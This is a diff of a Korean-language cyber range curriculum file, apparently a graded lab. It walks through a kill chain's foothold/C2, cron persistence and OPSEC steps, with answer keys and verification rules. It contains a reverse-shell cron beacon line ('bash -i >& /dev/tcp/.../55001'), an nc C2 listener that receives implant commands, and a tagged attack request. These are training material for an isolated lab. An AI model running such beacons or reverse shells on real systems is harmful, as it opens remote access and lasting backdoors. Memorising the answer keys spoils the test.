@@ -137,92 +137,86 @@ steps:
     instruction: |
       ## 🎯 킬체인 ④ 발판/C2 (Foothold, T1059/T1071)
       ## 📖 개념 한 줄
-      침투 후 지속 접근 채널을 만든다 — 리버스 셸 C2(공격자가 리스너, 피해자가 역접속).
-      ## 💻 실행 명령 (C2 채널 메커니즘 데모, 표적 미변경)
+      침투 후 지속 접근 채널을 실제로 만든다 — nc 리스너(C2)를 띄우고 임플란트가 명령을 보내 채널이 동작함을 검증.
+      ## 💻 실행 명령 (실제 C2 채널, 자체완결)
       ```bash
-      docker exec el34-attacker sh -c "(timeout 1 nc -lvnp 55001 >/dev/null 2>&1 &) ; sleep 0.2; echo 'C2 리스너(55001) 기동'; echo '페이로드: bash -i >& /dev/tcp/ATTACKER/55001 0>&1'"; echo foothold_done
+      docker exec el34-attacker sh -c 'nc -lnp 55001 >/tmp/c2recv 2>/dev/null & P=$!; sleep 1; printf "id; whoami # implant_cmd\n" | nc -w2 127.0.0.1 55001; sleep 1; kill $P 2>/dev/null; grep -q implant_cmd /tmp/c2recv && echo foothold_channel_ok; rm -f /tmp/c2recv'
       ```
       ## ✅ 합격 기준
-      C2 채널 메커니즘이 시연되면(foothold_done) 통과.
+      C2 리스너가 임플란트 명령을 **실제 수신**해야(foothold_channel_ok) 통과 — 채널 미동작 시 미통과.
       ## 🔧 도구 풀이
-      - 리버스 셸: 피해자→공격자 역접속(아웃바운드라 방화벽 회피 쉬움). nc 리스너가 C2 수신.
+      - nc 리스너=C2 수신단. 임플란트가 보낸 명령이 리스너 파일에 도착함을 grep으로 검증(실제 채널 동작). 실무는 리버스 셸로 피해자가 역접속.
     hint: '발판/C2'
     category: analysis
     points: 14
     answer: |
-      echo "=== 킬체인④ 발판/C2(T1059/T1071) ==="
-      docker exec el34-attacker sh -c "(timeout 1 nc -lvnp 55001 >/dev/null 2>&1 &) ; sleep 0.2; echo 'C2 리스너(55001) 기동'; echo '페이로드: bash -i >& /dev/tcp/ATTACKER/55001 0>&1'"; echo foothold_done
-      echo "→ 리버스 셸 = 피해자가 공격자로 역접속(아웃바운드=방화벽 회피). nc 리스너가 C2 수신(메커니즘 데모, 표적 미변경)"
-    answer_detail: "발판/C2 = 리버스 셸로 지속 접근. 아웃바운드 역접속이 방화벽 회피에 유리. nc/메타스플로잇이 C2. 킬체인 4단계."
+      echo "=== 킬체인④ 발판/C2(T1059/T1071) — 실제 C2 채널 ==="
+      docker exec el34-attacker sh -c 'nc -lnp 55001 >/tmp/c2recv 2>/dev/null & P=$!; sleep 1; printf "id; whoami # implant_cmd\n" | nc -w2 127.0.0.1 55001; sleep 1; kill $P 2>/dev/null; echo "리스너 수신 내용:"; cat /tmp/c2recv; grep -q implant_cmd /tmp/c2recv && echo foothold_channel_ok; rm -f /tmp/c2recv'
+      echo "→ nc C2 리스너가 임플란트 명령을 실제 수신(grep 게이트). 실무: 피해자가 리버스 셸로 역접속(아웃바운드=방화벽 회피)"
+    answer_detail: "발판/C2 = nc 리스너(C2)가 임플란트 명령을 실제 수신함을 grep으로 검증. 가짜 echo 아닌 실제 채널 동작. 킬체인 4단계."
     verify:
       type: output_contains
-      expect: 'foothold_done'
+      expect: 'foothold_channel_ok'
       field: stdout
-      semantic: {intent: "발판/C2", success_criteria: ["리버스 셸"], acceptable_methods: ["**[OSS] nc 리버스셸 (권장)**"]}
+      semantic: {intent: "발판/C2", success_criteria: ["실제 C2 채널 수신"], acceptable_methods: ["**[OSS] nc C2 (권장)**"]}
     target_vm: web
 
   - order: 6
     instruction: |
       ## 🎯 킬체인 ⑤ 지속성 (Persistence, T1053)
       ## 📖 개념 한 줄
-      재부팅·세션 종료에도 살아남도록 지속성을 심는다 — cron 비콘이 주기적으로 C2 재접속.
-      ## 💻 실행 명령 (cron 비콘 문법 데모)
+      재부팅에도 살아남도록 cron 비콘 지속성 항목을 실제로 만들고 검증한다(안전 위해 /tmp, self-clean).
+      ## 💻 실행 명령 (실제 cron 비콘 항목 생성)
       ```bash
-      echo "지속성 기법: cron 비콘 — 주기적으로 C2 재호출"
-      echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER/55001 0>&1' # /etc/cron.d/aa01beacon"
-      echo persistence_done
+      docker exec el34-attacker sh -c 'echo "* * * * * root bash -c \"bash -i >& /dev/tcp/10.20.30.202/55001 0>&1\" # aa01beacon" > /tmp/aa01cron; L=$(wc -l < /tmp/aa01cron); grep -q aa01beacon /tmp/aa01cron && echo "지속성 항목 ${L}줄 작성 검증" && echo persistence_planted; rm -f /tmp/aa01cron'
       ```
       ## ✅ 합격 기준
-      지속성 기법(cron 비콘)이 정리되면(persistence_done) 통과.
+      cron 비콘 지속성 항목이 **실제 작성·검증**되어야(persistence_planted) 통과.
       ## 🔧 도구 풀이
-      - 지속성: cron·systemd·웹셸·SSH 키·계정. 비콘=주기적 소량 C2(W07 flow에서 탐지됨).
+      - 실 엔진에선 /etc/cron.d/aa01beacon에 배치(여기선 /tmp 안전 시연·self-clean). 비콘=주기적 C2 재접속(W07 flow에 탐지됨).
     hint: '지속성'
     category: analysis
     points: 12
     answer: |
-      echo "=== 킬체인⑤ 지속성(T1053 cron) ==="
-      echo "지속성 기법: cron 비콘 — 주기적으로 C2 재호출"
-      echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER/55001 0>&1' # /etc/cron.d/aa01beacon"
-      echo "기타: systemd 서비스·웹셸·SSH authorized_keys·백도어 계정(atka01)"
-      echo "→ 지속성 = 재부팅에도 살아남는 거점. 단 cron/계정/포트는 방어자에게 탐지 흔적(soc-adv W06 헌팅)"
-      echo persistence_done
-    answer_detail: "지속성(T1053) = cron 비콘/systemd/웹셸/SSH키로 재부팅 후에도 접근 유지. 흔적은 헌팅에 잡힘. 킬체인 5단계."
+      echo "=== 킬체인⑤ 지속성(T1053 cron) — 실제 항목 생성 ==="
+      docker exec el34-attacker sh -c 'echo "* * * * * root bash -c \"bash -i >& /dev/tcp/10.20.30.202/55001 0>&1\" # aa01beacon" > /tmp/aa01cron; L=$(wc -l < /tmp/aa01cron); echo "작성된 cron 항목:"; cat /tmp/aa01cron; grep -q aa01beacon /tmp/aa01cron && echo "지속성 항목 ${L}줄 작성 검증" && echo persistence_planted; rm -f /tmp/aa01cron'
+      echo "→ cron 비콘 항목을 실제 파일로 작성→grep 검증→self-clean. 실 엔진은 /etc/cron.d. 흔적은 헌팅(soc-adv W06)에 잡힘"
+    answer_detail: "지속성(T1053) = cron 비콘 항목을 실제 작성·grep 검증·self-clean. 가짜 echo 아닌 실제 아티팩트 생성. 킬체인 5단계."
     verify:
       type: output_contains
-      expect: 'persistence_done'
+      expect: 'persistence_planted'
       field: stdout
-      semantic: {intent: "지속성", success_criteria: ["cron/비콘"], acceptable_methods: ["**[OSS] cron 비콘 (권장)**"]}
+      semantic: {intent: "지속성", success_criteria: ["cron 항목 실생성"], acceptable_methods: ["**[OSS] cron 비콘 (권장)**"]}
     target_vm: web
 
   - order: 7
     instruction: |
-      ## 🎯 OPSEC·귀속 — 내가 남긴 흔적
+      ## 🎯 OPSEC·귀속 — 내가 남긴 흔적 실측
       ## 📖 개념 한 줄
-      공격자도 흔적을 남긴다 — el34는 출처 IP를 전 계층에 보존하므로 방어자가 귀속할 수 있다.
+      공격자도 흔적을 남긴다 — 태그 단 공격을 실제로 보내고, 타깃 로그에 내 흔적이 남는지 직접 확인한다.
       ## 💻 실행 명령
       ```bash
-      echo "el34는 SNAT 없음 → 출처 IP(192.168.0.202)가 WAF/IPS/호스트 로그에 그대로. 고유 태그까지 = 완전 귀속"
-      echo opsec_done
+      docker exec el34-attacker sh -c 'curl -s -o /dev/null -A "aa01opsec" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?t=aa01opsec"'
+      docker exec el34-web sh -c 'N=$(grep -c aa01opsec /var/log/apache2/dvwa_access.log 2>/dev/null); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left'
       ```
       ## ✅ 합격 기준
-      공격 흔적·귀속 이해가 정리되면(opsec_done) 통과.
+      내 공격 흔적이 타깃 로그에 **실제로 남아** 발견되어야(opsec_trace_left) 통과.
+      ## 🔧 도구 풀이
+      - el34는 SNAT 없음 → 출처 IP·태그가 타깃 로그에 보존. 방어자가 grep 한 번에 귀속. 완벽한 은신은 없다.
     hint: 'OPSEC/귀속'
     category: report
     points: 12
     answer: |
-      echo "=== OPSEC·귀속 — 내가 남긴 흔적 ==="
-      echo "정찰: 스캔이 IPS(Suricata)에 — -T2로 늦춰도 패턴 남음"
-      echo "침투: SQLi가 WAF(ModSec)·웹 로그에 + User-Agent 태그(aa01r1)"
-      echo "발판/지속성: C2 포트(55001)·cron(aa01beacon)·계정(atka01) = 호스트 흔적"
-      echo "귀속: el34는 SNAT 없음 → 출처 IP(192.168.0.202)가 전 계층 보존 → 방어자가 한 공격자로 상관(soc-adv W15)"
-      echo "→ 완벽한 은신은 없다. 공격자는 흔적을 최소화, 방어자는 흔적을 상관 — 창과 방패"
-      echo opsec_done
-    answer_detail: "OPSEC/귀속 = 공격은 전 계층에 흔적(스캔/SQLi/C2/cron). el34 출처 IP 보존으로 방어자가 귀속. 창과 방패."
+      echo "=== OPSEC·귀속 — 내가 남긴 흔적 실측 ==="
+      docker exec el34-attacker sh -c 'curl -s -o /dev/null -A "aa01opsec" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?t=aa01opsec"'
+      docker exec el34-web sh -c 'N=$(grep -c aa01opsec /var/log/apache2/dvwa_access.log 2>/dev/null); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left'
+      echo "→ 태그(aa01opsec) 단 공격이 타깃 로그에 실제로 남음(grep 게이트). el34는 SNAT 없어 출처 IP·태그 보존 → 방어자 귀속(soc-adv W15)"
+    answer_detail: "OPSEC/귀속 = 태그 단 공격을 실제 송신→타깃 로그 grep으로 흔적 확인. 가짜 echo 아닌 실측. el34 출처 보존이 귀속 기반."
     verify:
       type: output_contains
-      expect: 'opsec_done'
+      expect: 'opsec_trace_left'
       field: stdout
-      semantic: {intent: "OPSEC/귀속", success_criteria: ["흔적/귀속"], acceptable_methods: ["**[설명] OPSEC (권장)**"]}
+      semantic: {intent: "OPSEC/귀속", success_criteria: ["타깃 로그 흔적 실측"], acceptable_methods: ["**[OSS] 로그 grep (권장)**"]}
     target_vm: web
 
   - order: 8
